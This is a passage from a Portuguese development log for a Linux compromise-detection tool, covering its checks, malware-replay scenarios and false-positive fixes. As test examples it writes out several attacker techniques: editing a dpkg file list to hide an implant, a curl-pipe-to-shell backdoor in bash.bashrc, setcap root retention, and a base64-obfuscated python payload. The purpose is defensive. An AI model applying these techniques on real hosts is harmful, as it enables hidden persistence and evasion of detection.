Debian real: 16 de 17 corretos, e o único sem dono é o Go em /usr/local, que de
fato não veio de pacote.

E a pergunta é estreita de propósito: quem é dono do que está RODANDO ou
AGENDADO. "Quem é dono de cada arquivo do host" exigiria caminhar tudo.

### §7.9 — é o UID que define o poder, não o nome

O kernel só compara números: `systemd-net` com uid 0 É root. Auditoria por nome
de usuário acharia uma conta e perderia a outra, que é o ponto do disfarce.
Quatro checks: uid 0, senha vazia, conta de serviço que ganhou shell, e grupo
equivalente a root (`docker` monta o filesystem do host — é root por outro
caminho, e não aparece em auditoria de sudo nem de uid).

### Três falsos positivos, todos achados rodando contra imagem real

```
XCONSOLE=/dev/xconsole       eu extraía o valor de QUALQUER atribuição como
(Ubuntu 14.04, rsyslog)      caminho de programa. Agora só variável cujo valor
                             é EXECUTADO conta: BASH_ENV, ENV, PROMPT_COMMAND

rsyslogd persistido 2×       distribuição em transição do SysV entrega unit E
(Ubuntu 14.04)               init.d para o mesmo binário. Suprimido quando o
                             alvo TEM dono de pacote — e onde não dá para
                             perguntar, o achado sai dizendo isso

disk:x:6:root                o Alpine entrega isso de fábrica. Root num grupo
(Alpine)                     equivalente a root não informa nada
```

Depois das três: zero falso positivo em Debian 12, Alpine, CentOS 7, Ubuntu
14.04 e Debian 9.

### E o bloco de ação voltou a duplicar

Dois checks contribuíam o mesmo `cp` com comentários diferentes, e a
deduplicação era pela LINHA inteira. Agora é pelo comando. É a segunda vez que
este defeito volta — da primeira pela paralelização, desta pelo comentário.

### Estado

41 checks, 67 cenários, zero falso positivo. O cenário 66 planta a cadeia
completa e trava o resultado; o 71 continua documentando o que ainda passa.

Falta, e está medido: varredura de filesystem (§8 — implante largado e não
executado é invisível), anti-forense (fase 6), egress (3.2), amostragem em
janela (fase 10) e `--since` (fase 5) — a ferramenta ainda nunca pergunta
QUANDO.

---

## Registro — árvore de processos e visões cruzadas

Vindo de `heuristicas.md`: dos 20 checks do MVP daquele documento, faltavam a
linhagem (itens 4 e 5) e a comparação entre fontes (item 20) — que o próprio
documento chama de o recurso mais interessante.

### Linhagem: o processo isolado quase nunca é o sinal

`curl` sozinho é rotina. `curl` filho de `sh` filho de `nginx` é
pós-exploração de aplicação web, e a diferença está inteira na LINHAGEM. Dois
checks, com a mesma regra por trás: **um daemon de rede não abre shell — ele
responde requisição.**

```
proc.shell_from_service    nginx → sh → curl, com a cadeia inteira na evidência
proc.service_account_pty   PTY não é malicioso; o sinal é QUEM o tem
```

O segundo precisou de um helper novo que monta uma sessão interativa de
verdade: abre pseudoterminal, larga privilégio e executa o shell com o terminal
em fd 0, 1 e 2. E o cenário precisa de `SYS_PTRACE` — ler `/proc/<pid>/fd` de
processo com credencial diferente exige essa capability, e sem ela a ferramenta
declara a lacuna em vez de dizer que não há PTY.

### Cross-view: a pergunta que nenhum outro check faz

Os 43 checks anteriores perguntam *"isto que estou vendo é suspeito?"*. Estes
três perguntam **"o que estou vendo é TUDO que existe?"**.

```
cross.hidden_pid     PID que responde a stat e não aparece na listagem
cross.thread_count   status declara N threads, o diretório de tarefas mostra M
cross.module_view    módulo em /proc/modules e ausente de /sys/module
```

Tudo NATIVO. Comparar `ps` com `/proc` acrescentaria uma fonte e um risco ao
mesmo tempo — o binário do host é justamente o que pode estar adulterado.

Duas vias para PID oculto, e elas não valem o mesmo:

```
ppid       um processo VISÍVEL declara um pai que não aparece. Um stat resolve
           sem corrida: se o pai existe, a LISTAGEM mentiu → CRÍTICO
sondagem   PID que responde a stat sem estar na listagem. Pode pegar processo
           nascido entre as duas leituras → AVISO
```

Custo medido antes de escolher o teto: 65 mil sondagens = 124ms; 262 mil =
516ms. Ficou em 65536, com o alcance real DECLARADO na evidência — sem dizer
até onde sondou, "nenhum PID oculto" não significa nada.

### Três enganos meus, todos da mesma família

A sondagem nasceu com **152 falsos positivos** num desktop comum. As causas:

```
1  montei o conjunto "visível" a partir do que consegui LER, não do que o
   readdir LISTOU. A diferença entre os dois é permissão — a confusão entre
   "não achei" e "não consegui olhar", desta vez DENTRO da ferramenta

2  THREAD não é processo oculto. O procfs expõe /proc/<tid> para stat mas não
   lista TIDs no readdir; eles aparecem só em /proc/<pid>/task. O que separa
   está no próprio status: líder de grupo tem Tgid == Pid

3  lista de módulos VAZIA não é fonte ilegível. Guest sem módulo carregado tem
   /proc/modules vazio, e isso é resposta completa — tratar como lacuna fazia
   toda VM mínima sair degradada
```

O primeiro e o terceiro são a mesma pergunta em direções opostas, e é a
pergunta central desta ferramenta. Escrevê-la certa nos checks não impediu de
errá-la duas vezes no coletor.

Depois das três: 152 → **zero**, em desktop, Debian 12, Alpine, CentOS 7 e
Ubuntu 14.04.

### Uma impossibilidade declarada em vez de escondida

Os três checks de cross-view só disparam contra ocultação de VERDADE, e a suíte
não vai carregar um rootkit para se testar. O invariante "todo check tem
cenário" recusaria os três.

A saída não foi relaxar o invariante nem fingir um cenário: `Scenario` ganhou
`UntestableChecks`, e o cenário 91 declara a impossibilidade com o motivo
escrito. O pulo aparece na saída do teste, com a razão — que é o oposto de um
check sem cobertura passando despercebido.

O que a suíte prova é o contrário, e vale por si: em host limpo as três
comparações não produzem achado nenhum.

### Estado

46 checks, 70 cenários. `wtf` em 336ms.

---

## Registro — cenários de SITUAÇÃO, e o que eles encontraram

Os cenários até aqui exercitavam um check por vez: planta o artefato que aquele
check procura, verifica que ele dispara. Necessário e não suficiente — ficou
provado quando a cadeia completa do 66 saiu com `RESULT: OK`, cada peça
invisível porque nenhuma isolada era o que algum check procurava.

Os novos são histórias inteiras. E foram eles que acharam os defeitos.

### O cenário sem invasor nenhum

O 80 é um servidor de produção com dois anos de acúmulo: node e rclone
instalados à mão, agente de APM com preload, certbot em timer E cron, CA
corporativa, chave de automação com `command=`, gente no grupo docker, nvm no
fim do `.bashrc`. **Nada ali é ataque.**

A ferramenta tem coisas verdadeiras a dizer sobre quase tudo. Binário sem dono
de pacote É um fato; CA fora do bundle É um fato; grupo docker É root por outro
caminho. Nenhum é falso positivo — são achados corretos sobre um host que
ninguém invadiu.

O que decide se a ferramenta é usável numa frota é justamente esse número.
`Scenario` ganhou `MaxWarn`, e o 80 gasta 10 do orçamento: acima de uma dúzia o
operador aprende a ignorar a saída, e aí perde o achado que importa. Sem o
campo isso seria opinião; com ele é regressão.

E ele encontrou um erro de desenho no primeiro rodada:

```
command="/usr/bin/rrsync -ro /srv",restrict,no-pty
```

Eu acusava isso de backdoor. É o contrário: `command=` sozinho é a forma do
atacante — ele quer que algo rode; `command=` com `restrict` e `no-pty` é a
forma do administrador, que está IMPEDINDO o shell que o atacante quer. O check
já DOCUMENTAVA a distinção nos falsos positivos e não a usava. Agora a chave
endurecida cai para informativo.

### Três lacunas que os cenários expuseram

```
priv.sudo_nopasswd   f.Sudoers era COLETADO e nenhum check o lia. Dado morto:
                     o coletor trabalhava, o fato ia para o JSON, nada avaliava
net.listener_unowned porta aberta para fora por binário sem dono de pacote
net.egress_unowned   conexão para endereço público vinda de binário sem dono
```

O de sudo trouxe junto a mesma confusão de sempre: `/etc/sudoers` é 0440 de
root, e o coletor engolia o erro de leitura. Sem privilégio a ferramenta diria
"nenhuma regra perigosa" quando o que houve foi não ter conseguido olhar.

Os dois de rede só foram possíveis agora. O discriminador não existia quando o
`revshell` e o `pivot` foram escritos — sem propriedade de pacote, "processo com
conexão de saída" descreve metade de um servidor normal. E eles deliberadamente
NÃO olham o destino: reputação de IP envelhece em dias, exige fonte externa e
falha justamente contra quem alugou infraestrutura ontem. "Ninguém empacotou
este binário" é local e não envelhece.

### A previsão que se cumpriu

O cenário 71 media o adversário competente — o que leu as mesmas seções que eu.
O comentário dele dizia, por escrito:

> quando saída para IP público (3.2) e integridade de pacote (fase 7)
> chegarem, este cenário QUEBRA — de propósito.

Os dois chegaram, e ele quebrou. De **1 aviso** para **4**, por três ângulos que
não se contornam com a mesma jogada:

```
§7.2   alguém acrescentou execução a uma unit alheia
§24    nenhum pacote reivindica este binário
§4.3   e ele fala com um endereço público
```

Empacotar o implante mata o §24; persistir por outro caminho mata o §7.2;
esperar para conectar mata o §4.3. Os três ao mesmo tempo é outro nível de
esforço.

O limite que sobrou está escrito lá: os três achados têm sujeitos diferentes —
um pid, um caminho e um nome de unit — e a correlação agrupa por sujeito. Ver
que são o MESMO ator ainda é trabalho humano.

### Corridas: a mesma pergunta, quatro portas

O `cross.hidden_pid` acusou uma `kworker` a cada boot do kernel 3.18, sempre com
PID diferente — o sinal de corrida, não de ocultação. A primeira correção
(relistar `/proc`) não bastou: a thread nascia, era sondada e MORRIA antes da
relistagem.

"Oculto" significa uma coisa só, e as duas metades precisam valer JUNTAS:

```
EXISTE   e   NÃO É LISTADO
```

Verificar em momentos diferentes deixa passar as duas corridas opostas. Relistar
e reconferir a existência resolve as duas, ao preço de um readdir e um stat por
candidato. Três boots seguidos do 3.18: zero.

O `cross.thread_count` teve a mesma história do outro lado — o helper desta
suíte, que é Go, produziu divergência de 5 num contêiner. Nenhum limiar fixo
separa pool de threads de ocultação; o que separa é PERSISTIR. O filtro saiu do
check e virou releitura no coletor.

### E um defeito na própria suíte

`Forbid` com ID errado nunca dispara, e o cenário passa sem provar nada — a
mesma armadilha que a ferramenta existe para evitar, desta vez dentro do teste.
Quatro IDs meus estavam errados e passavam calados. Agora o cenário que cita
check inexistente falha.

### Estado

49 checks, 60 cenários, 85 execuções. Zero achado em host limpo, Debian 12,
Alpine 3.20, CentOS 7 e Ubuntu 14.04.

---

## Registro — cenários a partir do IMPLANTE, não do catálogo

Correção de método, e ela vale mais que qualquer check deste bloco.

Os cenários anteriores foram escritos olhando o que a ferramenta sabe ver. Isso
a mede contra ela mesma. Quando o `correlate.persistence_redundant` saiu AVISO
onde eu esperava CRÍTICO, eu **ajustei a expectativa** — e com isso o cenário
passou a descrever o comportamento em vez de cobrá-lo.

Os novos invertem a ordem: cada um planta o que a família planta de verdade, e
o `Expect` diz o que um responder PRECISA saber. Quando a ferramenta não
informa, o cenário falha — e o que se corrige é a ferramenta.

```
93  Kinsing        minerador em /tmp, cron que baixa e executa a cada minuto
94  XorDDoS        malware com forma de BIBLIOTECA, persistência tripla
95  Outlaw         força bruta em SSH, tudo dentro do home
96  HiddenWasp     rootkit de userland por ld.so.preload
97  módulo de kernel  carga no boot e a diretiva `install` do modprobe
98  retenção       SUID plantado: nem processo, nem conexão, nem agendamento
```

Na primeira execução, **cinco dos seis falharam**. Nenhuma dessas falhas eu
teria encontrado escrevendo cenário a partir do catálogo.

### O que estava faltando

**SUID não tinha check nenhum.** A retenção de root mais antiga que existe, e a
que todo intruso usa depois de escalar. Não deixa processo, conexão nem
agendamento — e os outros vinte checks de persistência procuram exatamente
essas três coisas. Precisou de varredura de filesystem, que é um modo de
procurar que a ferramenta não tinha: os outros coletores vão a lugares
NOMEADOS e leem o que está lá.

**A diretiva `install` do modprobe.** O nome engana — ela não carrega módulo,
executa um comando como root sempre que alguém pedir aquele módulo. Fica entre
dezenas de `blacklist` legítimos, e quem audita "o que roda no boot" olha
systemd e cron.

**O alvo do gatilho nunca era perguntado.** O XorDDoS põe `/lib/libudev.so` num
script de cron.hourly; o HiddenWasp põe `/lib/libselinux.so` no rc.local.
Nenhum baixa nada, nenhum tem pipe para shell, os dois caminhos parecem de
sistema — a heurística de conteúdo passa batido nos dois, com razão. O que
denuncia é a pergunta de propriedade sobre o ALVO, e o check já dizia isso nos
próprios falsos positivos sem usar: *"o que os separa é o caminho do que
executam e o dono do pacote"*.

**O conteúdo dos diretórios do cron não era lido.** `/etc/cron.hourly/gcc.sh`
era coletado como agendamento, mas o que ele EXECUTA ficava invisível. O
XorDDoS depende exatamente dessa indireção.

**`*/15` era ignorado.** Eu tinha endurecido o limiar para `>=` 15 minutos
argumentando que cadência redonda é manutenção. O argumento é bom e a conclusão
era errada: o Outlaw agenda `*/15` desde 2018. Quem isenta o agendador da
distribuição é a checagem de comando, que é precisa — o limiar não devia fazer
esse trabalho.

### E um defeito latente que só apareceu agora

O join de propriedade mapeava *forma no arquivo → UM caminho*. Com usrmerge,
`/bin/su` e `/usr/bin/su` geram as mesmas chaves; guardando um valor só, a
segunda inserção sobrescrevia a primeira e **um binário de sistema saía como
"nenhum pacote reivindica"**. Nenhum candidato anterior gerava as duas formas —
a varredura de SUID gerou, e dezenove binários da debian:12 viraram crítico.

O mesmo defeito estava no backend do apk, intocado.

E a normalização de usrmerge era uma TABELA escrita para Debian. O Arch funde
`/sbin` em `/usr/bin`, o que nenhuma tabela dessas prevê. Trocada por resolver
o diretório pelos symlinks REAIS do host — exato em vez de adivinhado, e
funciona em qualquer esquema de fusão. Junto veio o suporte a **pacman**, sem o
qual a pergunta de propriedade ficava muda em todo host Arch, enfraquecendo
meia dúzia de checks em silêncio.

### Falsos positivos medidos e fechados

```
19  debian:12    todo binário SUID do sistema, pelo defeito do join
25  ubuntu 14.04 scripts de cron.daily da distro, e caminhos que não executam
12  debian:12    arquivos de config do Docker chegando ao check de BINÁRIO
21  host Arch    units cujo binário opcional não existe no host
17  host Arch    /usr/sbin -> bin resolvido contra a raiz em vez do pai
 6  host Arch    driver TrueScale da Intel, legítimo e empacotado
```

Cada um virou uma regra com nome. A que mais se repete: **a pergunta de
propriedade só vale onde binário mora**. `/etc` é o território da configuração
local — o gerenciador só reivindica o que ELE entregou ali, e "sem dono" não
significa nada. Em `/lib` a mesma resposta significa tudo.

### Um limite que ficou escrito em vez de escondido

O check de SUID tem uma nota que diz "e é um interpretador: executar já devolve
root". Ela reconhece o interpretador pelo NOME — e no cenário 98 não disparou,
porque `.dbus-helper` é uma cópia de `/bin/sh` e o invasor renomeou. Que é o
que invasor faz.

A nota serve para o caso descuidado. Quem detectou os três SUID foi a pergunta
de propriedade e o diretório gravável, e as duas independem do nome.

### Estado

51 checks, 66 cenários, 97 execuções. Zero achado em host limpo, Debian 12,
Alpine 3.20, CentOS 7 e Ubuntu 14.04.

---

## Registro — adversários que atacam ESTA ferramenta

Os cenários de implante reproduzem famílias conhecidas. Estes perguntam outra
coisa: **o que faz um invasor que leu esta ferramenta?**

A pergunta importa porque a arma principal virou uma só — "nenhum pacote
reivindica este binário". Ela sustenta o §24, os dois checks de rede por origem,
o SUID e o alvo de gatilho. Defesa que carrega esse peso precisa ser atacada de
propósito.

```
A1  implante EMPACOTADO     derrota a pergunta de propriedade
A2  sem binário nenhum      persistência só com o que a distro já entregou
A3  ativação adiada         nada roda no instante da varredura
A4  data forjada            o relógio do arquivo mente
A5  ativação por socket     o backdoor só nasce quando alguém conecta
```

### A1: uma linha apagou tudo

Primeira medição: **`RESULT: OK — 51/51 checks. Nenhum indicador coberto
disparou.`**

Um implante SUID, com unit de systemd E cron `@reboot`, invisível por causa de:

```
echo /usr/local/sbin/implante >> /var/lib/dpkg/info/coreutils.list
```

A lista do dpkg é texto puro e gravável por root. Quem já é root para instalar o
implante já é root para escrever nela — não precisa construir pacote nenhum.

Duas coisas saíram disso.

A isenção por dono de pacote na redundância era larga demais: ela isentava
QUALQUER alvo empacotado. E o check novo, que é a resposta certa — em vez de
confiar na base, **perguntar se a base foi editada**.

A premissa forte que eu escrevi primeiro estava errada, e o host mostrou: o
Manjaro empacota `lightdm-settings` e `xflock4` em /usr/local. "Distribuição
nenhuma instala ali" é política do Debian, não regra da FHS. Então a
reivindicação sozinha é AVISO; ela vira crítica quando está **fazendo
trabalho** — o arquivo tem setuid, ou algum mecanismo aponta para ele.

### A2: o payload que se esconde de quem lê

`python3 -c "os.system(base64.b64decode(...))"` — o pipe para shell está DENTRO
do blob, e a detecção de "baixa e executa" exigia um pipe literal.

O sinal não é a família, é a forma: **configuração de persistência que ofusca o
próprio conteúdo não tem explicação legítima.** Administrador não esconde o que
ele mesmo instalou — quem lê o arquivo depois é ele.

### A5: o backdoor que não existe até alguém bater

Ativação por socket é desenho recomendado do systemd. O PID 1 escuta, e o
processo do invasor só nasce na conexão. Numa varredura a porta é do systemd, e
o implante não está em lugar nenhum.

Virou o gêmeo em disco do §4.2: unit `.socket` ou `.path` cujo serviço pareado
executa binário sem dono de pacote. E o roteiro diz a ordem que importa —
desabilitar o SOCKET antes do serviço, porque parar só o serviço deixa o gatilho
armado.

### A3 e A4 passaram, e vale dizer por quê

Ativação adiada e timestomping **não derrotaram nada**. As perguntas
estruturais — quem entregou este binário, quantos mecanismos apontam para ele —
não olham processo nem relógio.

A ferramenta cita data em dezenas de evidências, e o A4 mostra que nenhuma delas
é a detecção. Fica o limite escrito: ela não detecta o timestomping em si.
Comparar mtime com ctime (o `touch` não move o ctime) é barato e ainda não
existe.

### Falsos positivos, de novo medidos

```
21  host Arch     o pacote `filesystem` reivindica /home e /root — DIRETÓRIO
 3  host Arch     Manjaro empacota em /usr/local, e a premissa era falsa
 2  debian:12     apt e dpkg entregam cron.daily E timer para o mesmo alvo
```

O terceiro define onde ficou a linha da redundância: **dois mecanismos num alvo
empacotado é a distribuição; três não é ninguém por acidente.**

### Estado

53 checks, 71 cenários, 106 execuções. Zero achado em host limpo, Debian 12,
Alpine 3.20, CentOS 7 e Ubuntu 14.04.

---

## Registro — fase 7: integridade por hash

A pergunta de propriedade responde *"veio de um pacote?"*. Faltava a seguinte, e
a distância entre as duas é a distância entre ver e não ver o Ebury:

> **e continua sendo o que o pacote entregou?**

O Ebury põe a biblioteca dele NO LUGAR da legítima — caminho certo, nome certo,
dono de pacote em ordem. Todo check de propriedade responde "sim, veio de um
pacote", e todos estão certos e cegos ao mesmo tempo.

As três bases guardam o hash nativamente, o que mantém a regra de não chamar
binário do host:

```
dpkg     <pkg>.md5sums          md5, "hash  caminho"
         status: Conffiles:     md5 dos arquivos de configuração
apk      linha Z: no installed  SHA1 em base64, prefixo Q1
pacman   <pkg>/mtree            gzip, sha256digest= por linha
```

### O que mudou de forma estrutural

**Biblioteca virou candidata.** Ela não executa, não agenda, não conecta —
nenhuma das fontes anteriores a traria. A única que existe é o mapa de memória
dos processos, que já era lido para outra coisa. O `MapsOdd` guardava só as
bibliotecas de lugar ESTRANHO, que é a pergunta certa para "de onde veio"; para
"o conteúdo confere?" a lista precisa incluir justamente as que ele descarta.

**Cenário 92 saiu da lista de impossíveis.** Ele estava declarado
`Untestable` com o motivo escrito: *"vale construir quando a fase 7
(integridade) existir"*. Existe, e ele foi construído.

O plantio acrescenta um byte ao FIM de uma biblioteca ELF: o hash muda, o
carregador ignora os bytes extras, e o contêiner continua de pé. Dá para fazer
isso com a libc de um contêiner descartável sem derrubá-lo — e é também uma
técnica real de anexar carga.

**O limite do A4 foi fechado.** Ele dizia por escrito: *"a ferramenta não
detecta o timestomping em si; comparar mtime com ctime é barato, é possível, e
ainda não existe"*. O `touch` mexe na data de modificação e não alcança a de
metadados — só o kernel escreve ali. A pegada da falsificação é a falsificação.

### Três mecanismos legítimos que precisaram de nome

```
conffile   o dpkg NÃO põe config nos .md5sums — põe no status, campo próprio.
           Sem ler de lá, 18 arquivos por host ficavam "sem hash declarado" e
           toda varredura de Debian saía degradada. E são justamente
           /etc/init.d, /etc/pam.d e /etc/cron.*, onde a modificação importa

diversão   um pacote MOVE o arquivo de outro, de propósito e com registro. A
           imagem oficial do Ubuntu 14.04 desvia o /sbin/initctl assim. Não é
           lacuna: é um mecanismo cuja explicação é o próprio registro

symlink    o hash declarado descreve o LINK, não o alvo. Comparar conteúdo ali
           daria divergência em todo caminho ligado
```

O segundo é a terceira vez que a mesma distinção aparece nesta ferramenta —
*mecanismo declarado* não é *cegueira*. Um parcial que nunca sai gasta o sinal
de cobertura, que é justamente o que separa "não achei" de "não consegui
olhar".

### Custo, medido e limitado

Com as bibliotecas entrando na lista, o `wtf` no host saltou de 1,1s para 3,3s.
Duas correções:

```
paralelizar   hashear é I/O mais CPU, que reparte bem     3,3s → 1,5s
em fluxo      carregar o arquivo inteiro para depois copiá-lo num hash gasta
              o dobro; alguns candidatos são binários de centenas de megabytes
```

E um teto TOTAL de bytes, com os menores primeiro para caber mais antes do
corte. Sem ele o custo cresce com o host — dois mil mapeamentos distintos
levariam a varredura a dezenas de segundos. O que fica de fora é lacuna
declarada.

O `wtf` fica em 1,5s, dentro do orçamento de 2s que a SPEC 6.1 fixa, e o tempo
REAL continua impresso no RESULT.

### E o cross-compile pegou um defeito de portabilidade

`st.Ctim.Sec` é `int64` em 64 bits e `int32` em 32. Sem a conversão explícita o
binário i686 não compila — o mesmo eixo que os cenários 30 e 54 cobrem, e a
razão de o `make` construir as duas arquiteturas.

### Estado

55 checks, 73 cenários, 108 execuções. Zero achado em Debian 12, Alpine 3.20,
CentOS 7, Rocky 9 e Ubuntu 14.04, com cobertura completa nos três primeiros.

---

## Registro — revisão dos seis commits não revisados

Seis commits, ~5200 linhas. Nove defeitos, e dois deles eram regressões que a
suíte inteira aprovava.

### A regressão que a suíte não pegava

O bloco de isenção "tem dono de pacote, não é achado" foi aplicado a DOIS
checks quando eu queria um. O `persist.shell_startup` passou a calar sobre
arquivo empacotado — e `/etc/bash.bashrc` é empacotado.

Medido: `curl -s http://…/p.sh | sh` acrescentado ali saía como **um aviso de
hash**, com o check de persistência mudo. É backdoor de manual.

A correção não foi desfazer a isenção: foi trocar a condição. Não basta ter
dono, tem que estar **provadamente intacto** — e a prova passou a existir com a
fase 7. Sem prova disponível, não se suprime, porque ausência de prova não é
prova de integridade. O comentário que estava lá dizia por escrito o limite
("isto não vê modificação de arquivo empacotado") e ficou obsoleto no mesmo
commit em que a fase 7 o resolveu.

Resultado depois: dois sinais correlacionados, a linha suspeita e a prova de
que o arquivo do pacote mudou.

### A varredura de SUID não atravessava montagem

A baseline de dispositivo era a do `/`. Como `-xdev`, mas medida no lugar
errado: `/home` em partição própria — a norma em servidor — e `/tmp` em tmpfs —
o padrão do systemd — ficavam INTEIROS de fora.

Confirmado no host: um SUID em `~/.config` era invisível. A baseline passou a
ser por RAIZ, e cada árvore listada é percorrida inteira.

Isso trouxe o custo de verdade junto, e ele precisou de dois ajustes:

```
pular por nome    node_modules, .cache, .git, site-packages e afins. Um home
                  de desenvolvedor tem 270 mil diretórios; o teto de 40 mil
                  estourava e a varredura truncava em 15%
profundidade      cinco níveis dentro de /home e /root
```

Pular árvore NOMEADA é melhor que truncar por contagem: a exclusão é conhecida,
está escrita, e é a mesma em todo host — enquanto um corte por contagem cai num
lugar diferente a cada máquina e não diz onde parou.

### A mesma colisão de usrmerge, terceira vez

`map[string]string` nos três backends de hash. Sob usrmerge, `/bin/sh` e
`/usr/bin/sh` geram as MESMAS chaves; guardando um caminho só, a segunda
inserção sobrescreve a primeira.

**274 arquivos** num host real saíam como "não pude comparar", entre eles
`/bin/sh`, `/bin/kill` e `/bin/true`. Depois: 6, e todos legítimos.

Eu já tinha corrigido esse defeito nos dois lados da pergunta de propriedade,
no commit anterior, e o reproduzi em três funções novas.

### Uma corrida que o detector nunca viu

`go test -race ./...` NÃO alcança a suíte de cenários, que exige tag de build. E
foi ali que a corrida estava: os subtestes usam `t.Parallel()` e a validação de
IDs montava um mapa global preguiçosamente.

Junto veio um segundo defeito no mesmo lugar: a validação rodava dentro de
`assertScenario`, que **nunca executa para cenário pulado** — e
`UntestableChecks` só existe em cenário pulado. Um ID errado ali faria um check
parecer coberto sem nunca ter sido demonstrado.

Virou teste serial sobre todos os cenários, e o `make race` passou a rodar o
detector nos dois lugares. Rodá-lo só onde já estava coberto dá a sensação de
cobertura sem a cobertura.

### Os menores

```
sort com I/O       o comparador chamava Lstat POR COMPARAÇÃO — O(n log n)
                   syscalls — e comparador que faz I/O nem define ordem
                   consistente se um arquivo sumir no meio
ações perdidas     quando o primeiro comando de um achado já aparecera, o
                   `break` fazia aquele achado não contribuir com NADA. O
                   passo perdido era o `gcore`, único jeito de preservar
                   memória antes de matar
prefixo x token    `/usr/local/bin/foo` casava com quem executa `…/foobar`
Vanished           faltava a guarda no check de egress
ToUpper e índice   o parser de sudoers indexava a string maiúscula e fatiava a
                   original; ToUpper muda o tamanho em bytes de alguns
                   caracteres
símbolo e cópia    symlink não tem conteúdo próprio e virava lacuna falsa;
                   diversão do dpkg idem; mtree era copiado inteiro para ser
                   lido
```

### O erro que cometi pela quarta vez

Declarei o limite de profundidade de `/home` SEMPRE que o diretório existe, em
vez de só quando algo foi realmente cortado. É a mesma confusão entre **escolha
de escopo** e **cegueira** que já corrigi no xdev do SUID, na lista vazia de
módulos e na diversão do dpkg.

Vale mais registrar o padrão que a correção: toda vez que escrevo um limite,
a tentação é anunciá-lo incondicionalmente — e um parcial que nunca sai gasta
exatamente o sinal que separa "não achei" de "não consegui olhar", que é a
razão de esta ferramenta existir.

### Estado

55 checks, 73 cenários, 108 execuções. `make race` limpo nos dois pacotes.

---

## Registro — baseline

A pergunta que nenhum check fazia sozinho:

> **isso deveria existir NESTE host?**

Os 55 checks perguntam "isto é suspeito?" olhando forma, procedência e
integridade — todas propriedades do ARTEFATO. Nenhum deles sabe que o `rclone`
daquele servidor é o backup que roda desde 2023, nem que o binário sem dono de
pacote em `/usr/local` é a aplicação da casa.

Quem sabe isso é a história do host. A ferramenta não fala com outros hosts de
propósito — binário estático, local, sem rede —, então a história é TRAZIDA:

```
aletheia baseline -o base.json          captura o que existe hoje
aletheia scan --baseline base.json      mede contra isso
```

### O efeito medido

O cenário 80 é o servidor de produção com dois anos de acúmulo e sem invasor
nenhum. Cada aviso dele é um achado CORRETO — binário sem dono de pacote É um
fato, CA fora do bundle É um fato.

```
sem baseline    6 avisos · 1 manual   RESULT: WARNING
com baseline    0 · 0                 RESULT: OK
```

E o implante plantado DEPOIS da captura atravessa inteiro: crítico, três sinais
correlacionados, marcado `✳NOVO`.

### A propriedade que decidiu o desenho

A tentação óbvia é SUPRIMIR o que já era conhecido — é o que mais reduz ruído, e
é o que a maioria das ferramentas faz. O custo aparece num caso só, e ele não é
raro: **se a captura pegou o host já comprometido, suprimir abençoa o implante
para sempre**, e a ferramenta passa a certificar como limpo justamente o host
que deveria denunciar.

Por isso, aqui, casar com a baseline **nunca apaga**:

```
crítico → aviso      aviso → informativo      piso: informativo
```

O achado continua no relatório, com a data em que já estava lá, e com a frase
que o operador precisa ler: *estar na baseline não prova que é legítimo, prova
apenas que não é novo*. O exit também não vai a zero — host com implante
conhecido não é host aprovado.

É a mesma distinção que separa "não achei" de "não consegui olhar", e a baseline
é onde ela é mais fácil de trair. O cenário B2 existe só para isso.

### A autoridade se declara, nos dois canais

Uma baseline rebaixa achado, e autoridade que rebaixa precisa ser examinável.
O cabeçalho diz de onde veio, de quando, quantos calou — e as ressalvas:

```
capturada em OUTRO host        serve como imagem de referência
capturada há N dias            deriva normal já basta para descrever um host
                               que não existe mais
cobertura incompleta           o que não foi olhado na captura NÃO entrou, e
                               vai aparecer como novo sem ter nascido
```

E o mesmo vai para o **JSONL**, que é o que a automação de frota lê. Sem a linha
`id: baseline`, um agregador veria `verdict: OK` sem como distinguir "host
limpo" de "host cujos achados foram todos rebaixados por uma referência velha,
de outra máquina, capturada com metade da cobertura".

### Duas decisões de identidade

**A chave é `ID|Subject`**, e não um modelo de fatos. Ela não pode divergir do
que os checks produzem, porque é feita do que eles produzem.

**PID não serve de identidade** — muda a cada boot. Para achado de processo a
chave usa o EXECUTÁVEL, que sai dos fatos, e os dois lados da comparação
calculam igual. Processo sem exe legível não recebe chave nenhuma: entrar na
baseline sem identidade estável abençoaria qualquer processo que aparecesse
naquele PID depois.

**Esquema diferente é RECUSADO**, não interpretado torto: casar chave errada
abençoaria achado que ninguém aprovou.

### O que a baseline NÃO resolve

Ela responde "mudou desde quando eu olhei". Não responde "isto é normal para
esta CLASSE de host" — para isso a referência precisa vir da frota, agregada, e
a agregação é trabalho de quem opera, não deste binário. O formato é JSON de
propósito: interseção de baselines de N hosts é um script de dez linhas.

### Estado

55 checks, 76 cenários, 114 execuções. `make race` limpo nos dois pacotes.

---

## Registro — o que veio de ler osquery, tracee e velociraptor

Três ferramentas do mesmo espaço, lidas atrás de ideias — não de código: são
outra linguagem, outra escala e outro modelo de execução.

### Duas coisas extraídas, e a primeira era uma cegueira DENTRO de um check

**Capability em atributo estendido.** O osquery mantém uma tabela de xattr, e
foi ela que me fez olhar. A varredura de SUID era a resposta desta ferramenta
para "retenção de root", e ela procurava BIT — que é a metade em desuso:

```
/usr/bin/ping   -rwxr-xr-x   sem setuid nenhum, e o poder vem de cap_net_raw
setcap cap_setuid+ep /usr/local/bin/.x     root, e o modo continua 755
```

Medido no host: dez binários com capability em xattr, e `find -perm -4000` não
acha um. Um `setcap cap_setuid+ep` cria retenção de root que a varredura recém
construída como "a resposta" não enxergava.

Coube no check existente porque o discriminador é o mesmo — nenhum pacote
entregou isto. O que mudou foi o que se procura: privilégio, não bit.

**Atributo imutável.** Veio do artefato `Linux.Forensics.ImmutableFiles` do
velociraptor, cuja descrição resume o valor: *"às vezes é um sinal forte"*.

O que ele protege aqui não é a detecção — o §24 já pegava o arquivo por não ter
dono. É o ROTEIRO:

```
# rm -f /usr/local/sbin/.agent
rm: cannot remove '/usr/local/sbin/.agent': Operation not permitted
```

Como root. O roteiro que esta ferramenta imprime manda remover a persistência e
tirar o bit de privilégio, e contra um arquivo travado todos esses passos falham
— e falham de um jeito que parece defeito do host, não defesa do implante.

### Uma decisão que a leitura CONFIRMOU em vez de mudar

O osquery lê a base do RPM com **librpm**, biblioteca C. É a razão de a aletheia
declarar rpm como lacuna em vez de tentar: ler aquilo exigiria cgo, e o binário
deixaria de ser estático — que é a decisão da SPEC 4, a mesma que faz o cenário
92 provar que userland trojanizado não muda o resultado.

A lacuna declarada é a escolha certa, e agora tem uma segunda fonte dizendo que
não há caminho barato.

### O que ficou anotado e NÃO foi feito

```
ftrace hooks       o tracee lê /sys/kernel/tracing/enabled_functions, que é
